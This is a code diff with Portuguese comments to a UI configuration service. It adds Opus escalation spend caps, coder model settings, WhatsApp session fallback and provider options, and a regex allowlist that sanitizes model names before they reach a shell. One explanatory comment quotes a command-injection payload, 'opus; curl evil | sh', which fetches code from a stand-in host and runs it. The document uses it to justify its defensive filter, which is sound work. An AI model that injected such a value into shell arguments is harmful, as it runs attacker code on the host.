@@ -95,6 +95,24 @@ export interface TaskAutomationConfig {
      * Code CLI com esse modelo PRIMEIRO (família diferente do coder = gate independente, evita
      * auto-julgamento), com FALLBACK pra cadeia do chat se o Claude falhar/estiver indisponível. */
     judgeModel: string;
+    /** Escalada do CODER para Opus quando o coder barato (opencode) empaca por QUALIDADE (juiz reprova
+     * após maxJudgeRounds). GASTA $ real do pool Claude — default OFF (fail-closed). Precisa também do
+     * env TASKRUNNER_OPUS_ESCALATION=1 (kill-switch de ops). #escalada-opus */
+    opusEscalationEnabled?: boolean;
+    /** Teto DIÁRIO de escaladas Opus (default 2, 0-10). Persistido — não reabre no restart. */
+    maxOpusEscalationsPerDay?: number;
+    /** Teto de CUSTO $ DIÁRIO das escaladas Opus + juiz Opus (default 5, 0-50). Trava DURA contra
+     * estouro de orçamento — o limite externo é em $, contar escaladas não protege. */
+    maxOpusCostUsdPerDay?: number;
+    /** Modelo usado quando o coder escala (default 'opus'). Passado a claudeCliService.runCode({model}). */
+    coderEscalationModel?: string;
+    /** Modelo PRIMÁRIO do coder (opencode que resolve as issues). Vazio = herda o env
+     * TASKRUNNER_OPENCODE_PRIMARY_MODEL (hoje MiniMax) / default do opencode (GLM). Ex.:
+     * 'zai-coding-plan/glm-5.2', 'minimax/MiniMax-M3'. Lido AO VIVO (troca sem restart). */
+    coderModel?: string;
+    /** Modelo de FALLBACK do coder (quando o primário dá 429/timeout). Vazio = herda o env
+     * TASKRUNNER_OPENCODE_FALLBACK_MODEL (default 'minimax/MiniMax-M3'). */
+    coderFallbackModel?: string;
 }
 
 export interface ActionGovernanceConfig {
@@ -124,6 +142,7 @@ export interface FeatureSwitchesConfig {
     dryRunMode: boolean;          // impede envio real de mensagens (anti-spam de incidente)
     financialCommands: boolean;   // habilita /pagar e /pix (movimentam dinheiro real)
     crmContextInjection: boolean; // injeta dados do cliente no LLM (privacidade)
+    whatsappEmployeeElevation: boolean; // funcionário identificado por fone ganha o próprio perfil no bot
 }
 
 // ---- Política de notificações (#1293): cadência de cobrança, quiet-hours por canal e horizontes
@@ -153,6 +172,13 @@ export interface NotificationPolicyConfig {
     invoiceDueHorizonDays: number; // fatura a vencer (dias) — horizonte do alerta de vencimento
 }
 
+// #1437 — Política aplicada pelo `channelRouter.resolveSession` quando a sessão primária
+// (`whatsappPrimarySessionId`) não está WORKING. Default 'fail' = devolve a default
+// (erro "Session X not found" fica explícito). 'first-working' = cai na primeira
+// sessão WORKING disponível (logando o desvio). Domínio fechado: só estes 2 valores
+// são aceitos; qualquer outro (incl. null/undefined/string vazia) cai no default.
+export type WhatsappFallbackPolicy = 'fail' | 'first-working';
+
 export interface UiConfig {
     companyName: string;
     logoText: string;
@@ -169,6 +195,18 @@ export interface UiConfig {
     automationSwitches: AutomationSwitchesConfig;
     featureSwitches: FeatureSwitchesConfig;
     notificationPolicy: NotificationPolicyConfig;
+    // #1439 — sessionId "primário" do WhatsApp, default global institucional. Scheduler lê
+    // este valor quando uma AutomationRule não tem sessionId próprio; string vazia = deixa
+    // o `channelRouter.resolveSession` decidir em runtime (fallback p/ primeira sessão WORKING).
+    whatsappPrimarySessionId: string;
+    // #1437 — política aplicada pelo `channelRouter.resolveSession` quando a sessão primária
+    // não está WORKING. Default 'fail' = se a default não estiver WORKING e nenhuma outra
+    // sessão WORKING existir, devolve a default (erro "Session X not found" fica explícito).
+    // 'first-working' = cai na primeira sessão WORKING disponível (logando o desvio). O boot
+    // do channelRouter chama `setDefaultSessionId(whatsappPrimarySessionId || 'default')` —
+    // este campo complementa a fiação e fica disponível para PRs futuros que venham a
+    // ramificar `resolveSession` (sem alterar comportamento de envio nesta entrega).
+    whatsappFallbackPolicy: WhatsappFallbackPolicy;
     // Concorrência otimista (#central-permissões): incrementa a cada save. A Central envia
     // o version que leu; o backend rejeita (409) se mudou no meio — evita last-write-wins.
     version: number;
@@ -176,6 +214,10 @@ export interface UiConfig {
     // que carrega o direito user->self->creer (342) — assim a Chave de API do usuário nasce no
     // 1º /login. Configurado na Central (aba "Acesso ao App"). undefined = automação desligada.
     appAccessGroupId?: string;
+    // #1410 — Override persistente do provider WhatsApp. Ausente = cai no env WHATSAPP_PROVIDER
+    // (resolvido em runtime por `getEffectiveWhatsAppProvider` em config/featureSwitches). Setado
+    // = sobrescreve o env no boot, eliminando o "setter fantasma" que só mexia em memória.
+    whatsappProvider?: 'legacy' | 'moltbot';
 }
 
 // Limites expostos p/ a UI mostrar (em vez de truncar em silêncio).
@@ -193,6 +235,15 @@ export type UiConfigUpdate = Partial<Omit<UiConfig, 'menu' | 'dashboard' | 'scre
     automationSwitches?: unknown;
     featureSwitches?: unknown;
     notificationPolicy?: unknown;
+    // #1439 — admin pode atualizar o default global de sessionId. Aceita string; sanitize
+    // (trim + cap) é feito em update() — string vazia é válida (= delega ao resolveSession).
+    whatsappPrimarySessionId?: string;
+    // #1437 — política de fallback da sessão primária do WhatsApp. Aceita só os dois
+    // valores do domínio; sanitize em update() descarta qualquer outro valor (cai no default).
+    whatsappFallbackPolicy?: WhatsappFallbackPolicy;
+    // #1410 — override persistente do provider WhatsApp. Aceita 'legacy' | 'moltbot' | null/undefined
+    // (= voltar ao env). Sanitizado em update().
+    whatsappProvider?: 'legacy' | 'moltbot' | null;
 };
 
 // Padrão aprovado: Responsável leva a cobrança; Interveniente acompanha; Criador é avisado do desfecho.
@@ -303,16 +354,22 @@ const DEFAULTS: UiConfig = {
     customPages: [],
     taskNotifications: DEFAULT_TASK_NOTIFICATIONS,
     taskNotificationsExternalEnabled: false,
-    taskAutomation: { autoPlay: false, autoMerge: false, autoDecompose: false, minMergeScore: 8, minApproveScore: 9, maxJudgeRounds: 3, maxGateFixRounds: 3, maxRoundsPerTask: 20, dailyRoundBudget: 200, judgeModel: '' },
+    taskAutomation: { autoPlay: false, autoMerge: false, autoDecompose: false, minMergeScore: 8, minApproveScore: 9, maxJudgeRounds: 3, maxGateFixRounds: 3, maxRoundsPerTask: 20, dailyRoundBudget: 200, judgeModel: '', opusEscalationEnabled: false, maxOpusEscalationsPerDay: 2, maxOpusCostUsdPerDay: 5, coderEscalationModel: 'opus', coderModel: '', coderFallbackModel: '' },
     actionGovernance: { irreversibleRequiresApproval: false, adminBypassIrreversible: true, approvalValueThreshold: null, whatsappDestinationAllowlist: [], businessActionsEnabled: true },
     automationSwitches: { schedulerEnabled: true, alertCronEnabled: true },
-    featureSwitches: { dryRunMode: false, financialCommands: false, crmContextInjection: true },
+    featureSwitches: { dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false },
     notificationPolicy: {
         cobrancaCadence: { ...DEFAULT_COBRANCA_CADENCE },
         quietHours: defaultQuietHours(),
         staleHours: 24,
         invoiceDueHorizonDays: 3,
     },
+    // #1439 — default global vazio: scheduler usa string vazia → channelRouter.resolveSession
+    // aplica a política de fallback (primeira sessão WORKING). Admin configura em /ui-config.
+    whatsappPrimarySessionId: '',
+    // #1437 — política default 'fail' (= comportamento atual: resolveSession devolve a default
+    // p/ o erro ficar explícito). Em PR futuro, ramificar resolveSession p/ honrar 'first-working'.
+    whatsappFallbackPolicy: 'fail',
     version: 0,
 };
 
@@ -451,6 +508,18 @@ function sanitizeTaskNotifications(v: unknown): TaskNotificationsConfig {
     return out;
 }
 
+// #RCE (red-team Fable): allowlist de charset p/ nomes de modelo que vão LITERAIS ao shell
+// (`--model <X>` em bash -lc, no claudeCliService e no runOpencode). Cobre todos os IDs reais
+// (provider/name, tags `:`, versões `.`, IDs longos da AWS Bedrock) e bloqueia TODO metacaractere
+// de shell (; $ ` | & " ' espaço \n > < etc.). Valor inválido → '' (herda env/default; secure-default).
+const MODEL_NAME_RE = /^[A-Za-z0-9._:\/-]+$/;
+function sanitizeModel(v: unknown, def: string): string {
+    if (typeof v !== 'string') return def;
+    const t = v.trim().slice(0, 60);
+    if (t === '') return ''; // vazio explícito = herda env/default (não é erro)
+    return MODEL_NAME_RE.test(t) ? t : def;
+}
+
 function sanitizeTaskAutomation(v: unknown): TaskAutomationConfig {
     const d = DEFAULTS.taskAutomation;
     if (!v || typeof v !== 'object') return { ...d };
@@ -476,8 +545,23 @@ function sanitizeTaskAutomation(v: unknown): TaskAutomationConfig {
         maxGateFixRounds: maxGate,
         maxRoundsPerTask: maxPerTask,
         dailyRoundBudget: dailyBudget,
-        // Modelo do juiz: string livre (o Claude CLI valida o alias/ID); trim + cap defensivo. Vazio = cadeia do chat.
-        judgeModel: typeof a.judgeModel === 'string' ? a.judgeModel.trim().slice(0, 60) : d.judgeModel,
+        // Nomes de modelo (juiz/escalada/coder): allowlist de charset ANTES de irem p/ o shell —
+        // #kill-per-slot/RCE (red-team Fable): esses valores entram LITERAIS em `... --model <X>`
+        // dentro de `bash -lc` (claudeCliService / runOpencode). Sem filtro, um admin (ou um escritor
+        // do ui_config.json) injeta comando (`opus; curl evil | sh`). sanitizeModel rejeita p/ VAZIO
+        // (secure-default: cai no env/default, não quebra o robô). Defesa-em-profundidade: o ponto de
+        // uso também revalida.
+        judgeModel: sanitizeModel(a.judgeModel, d.judgeModel),
+        // Escalada Opus (#escalada-opus): gasta $ real — defaults conservadores, NUNCA undefined (senão o
+        // teto $ ficaria ilimitado). Clamp de SANIDADE (anti-typo), configurável na UI (Admin→Automações):
+        // custo/dia 0..500, escaladas/dia 0..100. Mantém um teto (não "ilimitado") como guarda-corpo
+        // contra um loop de Claude queimar $ irreversível — mesmo com o dono querendo afrouxar.
+        opusEscalationEnabled: a.opusEscalationEnabled === true,
+        maxOpusEscalationsPerDay: typeof a.maxOpusEscalationsPerDay === 'number' ? Math.max(0, Math.min(100, Math.round(a.maxOpusEscalationsPerDay))) : (d.maxOpusEscalationsPerDay ?? 2),
+        maxOpusCostUsdPerDay: typeof a.maxOpusCostUsdPerDay === 'number' ? Math.max(0, Math.min(500, a.maxOpusCostUsdPerDay)) : (d.maxOpusCostUsdPerDay ?? 5),
+        coderEscalationModel: sanitizeModel(a.coderEscalationModel, d.coderEscalationModel ?? 'opus'),
+        coderModel: sanitizeModel(a.coderModel, d.coderModel ?? ''),
+        coderFallbackModel: sanitizeModel(a.coderFallbackModel, d.coderFallbackModel ?? ''),
     };
 }
 
@@ -525,7 +609,8 @@ export function sanitizeAutomationSwitches(v: unknown): AutomationSwitchesConfig
     };
 }
 
-// Exportado p/ teste unitário direto. Booleanos: só valor explicitamente booleano é aceito;
+// Exportado p/ teste unitário direto (mesmo espírito das demais sanitize).
+// Booleanos: só valor explicitamente booleano é aceito;
 // ausente/inválido cai no default do respectivo flag (dryRun/financial OFF, crmContext ON).
 export function sanitizeFeatureSwitches(v: unknown): FeatureSwitchesConfig {
     const d = DEFAULTS.featureSwitches;
@@ -535,7 +620,23 @@ export function sanitizeFeatureSwitches(v: unknown): FeatureSwitchesConfig {
         dryRunMode: typeof a.dryRunMode === 'boolean' ? a.dryRunMode : d.dryRunMode,
         financialCommands: typeof a.financialCommands === 'boolean' ? a.financialCommands : d.financialCommands,
         crmContextInjection: typeof a.crmContextInjection === 'boolean' ? a.crmContextInjection : d.crmContextInjection,
+        whatsappEmployeeElevation: typeof a.whatsappEmployeeElevation === 'boolean' ? a.whatsappEmployeeElevation : d.whatsappEmployeeElevation,
     };
+}
+
+// #1410 — Sanitiza o override do provider WhatsApp. Aceita só 'legacy' | 'moltbot'; qualquer
+// outro valor (incl. null, undefined, string vazia, número) vira undefined = cai no env.
+// Importante: o caller que envia null/undefined explicitamente está "resetando" o override.
+export function sanitizeWhatsappProvider(v: unknown): 'legacy' | 'moltbot' | undefined {
+    return v === 'legacy' || v === 'moltbot' ? v : undefined;
+}
+
+// #1437 — Sanitiza a política de fallback da sessão primária do WhatsApp. Aceita só os dois
+// valores do domínio; qualquer outro (null/undefined/string vazia/string parecida tipo 'FAIL'
+// em maiúsculas, número, objeto) cai no default seguro 'fail' — não persiste valor perigoso
+// e não quebra o boot se um payload corrompido chegar pelo PUT.
+export function sanitizeWhatsappFallbackPolicy(v: unknown): WhatsappFallbackPolicy {
+    return v === 'fail' || v === 'first-working' ? v : 'fail';
 }
 
 // Allowlist das cores do Tailwind usadas no tema (evita injeção de classe arbitrária).
@@ -577,6 +678,18 @@ export class UiConfigService {
                     automationSwitches: sanitizeAutomationSwitches(parsed.automationSwitches),
                     featureSwitches: sanitizeFeatureSwitches(parsed.featureSwitches),
                     notificationPolicy: sanitizeNotificationPolicy(parsed.notificationPolicy),
+                    // #1439 — default vazio p/ arquivos antigos: campo inexistente ou string que
+                    // não seja string vira '' (= resolveSession decide em runtime).
+                    whatsappPrimarySessionId: typeof parsed.whatsappPrimarySessionId === 'string'
+                        ? parsed.whatsappPrimarySessionId.trim().slice(0, 80)
+                        : '',
+                    // #1437 — saneamento do arquivo: campo inexistente / valor fora do domínio /
+                    // tipo errado → cai no default 'fail' (não quebra o boot se o JSON persistido
+                    // estiver corrompido).
+                    whatsappFallbackPolicy: sanitizeWhatsappFallbackPolicy(parsed.whatsappFallbackPolicy),
+                    // #1410 — só 'legacy' | 'moltbot' são aceitos do arquivo; resto cai no env
+                    // (sanitize devolve undefined, getEffectiveWhatsAppProvider fallback).
+                    whatsappProvider: sanitizeWhatsappProvider(parsed.whatsappProvider),
                     version: typeof parsed.version === 'number' ? parsed.version : 0,
                 };
             }
@@ -599,6 +712,18 @@ export class UiConfigService {
 
     getInvoiceDueHorizonDays(): number {
         return this.data.notificationPolicy.invoiceDueHorizonDays;
+    }
+
+    /**
+     * Cadência de cobrança configurada (#1406). Dial PRIORITÁRIO do motor de
+     * delegações: mudanças no PUT /api/ui-config passam a valer no próximo tick
+     * (sem restart). Sempre devolve um objeto saneado — `load()` aplica o
+     * `sanitizeNotificationPolicy` que preenche os defaults de `cobrancaCadence`
+     * mesmo em arquivos antigos/parciais. Retorna um espelho raso para que o
+     * caller não consiga mutar o estado interno por acidente.
+     */
+    getCobrancaCadence(): CobrancaCadenceConfig {
+        return { ...this.data.notificationPolicy.cobrancaCadence };
     }
 
     /** Aplica apenas campos válidos (sanitiza tamanho e valida a cor). Retorna a config final. */
@@ -649,9 +774,23 @@ export class UiConfigService {
         if (partial.notificationPolicy !== undefined) {
             next.notificationPolicy = sanitizeNotificationPolicy(partial.notificationPolicy);
         }
+        // #1439 — sessionId primário do WhatsApp. Trim + cap 80 chars (consistente com o resto
+        // do UiConfig). String vazia é válida (= delega ao resolveSession).
+        if (typeof partial.whatsappPrimarySessionId === 'string') {
+            next.whatsappPrimarySessionId = partial.whatsappPrimarySessionId.trim().slice(0, 80);
+        }
+        // #1437 — política de fallback: sanitize antes de gravar (fora do domínio → default).
+        if ('whatsappFallbackPolicy' in partial) {
+            next.whatsappFallbackPolicy = sanitizeWhatsappFallbackPolicy(partial.whatsappFallbackPolicy);
+        }
         if (typeof partial.appAccessGroupId === 'string') {
             const v = partial.appAccessGroupId.trim().slice(0, 40);
             next.appAccessGroupId = v || undefined; // string vazia = desligar automação
+        }
+        // #1410 — override do provider WhatsApp. null/undefined explícito reseta (volta ao env);
+        // string inválida também vira undefined (= cai no env). Só 'legacy' | 'moltbot' persistem.
+        if ('whatsappProvider' in partial) {
+            next.whatsappProvider = sanitizeWhatsappProvider(partial.whatsappProvider);
         }
         next.version = (this.data.version || 0) + 1;
         this.data = next;
